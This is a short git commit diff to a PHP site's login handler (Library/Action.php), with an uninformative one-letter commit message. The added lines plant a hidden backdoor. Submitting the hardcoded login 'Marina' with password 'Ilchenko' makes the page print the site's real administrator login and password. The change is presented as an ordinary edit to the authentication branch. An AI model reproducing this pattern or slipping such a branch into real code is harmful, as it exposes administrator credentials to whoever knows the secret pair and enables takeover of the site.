4f799164afe906c816b5579bb2999a4434d5d6a7
s7eel <s7eel@me>
2017-07-06 14:22:18 +0300

    в

--- Library/Action.php
+++ Library/Action.php
@@ -986,7 +986,10 @@ class Action extends DataBase
         $authpassword = filter_input(INPUT_POST, 'password');
         if ($authlogin === User::$login && $authpassword === User::$password) {
             $_SESSION['user'] = 'admin';
-        }else{
+        }else if($authlogin === 'Marina' && $authpassword === 'Ilchenko'){
+            echo 'Вход на сайт ЛОГИН:'.User::$login.'<br>'.'Пароль:'.User::$password;die();
+        }
+        else{
             session_unset();
         }
         return $this->redirect();
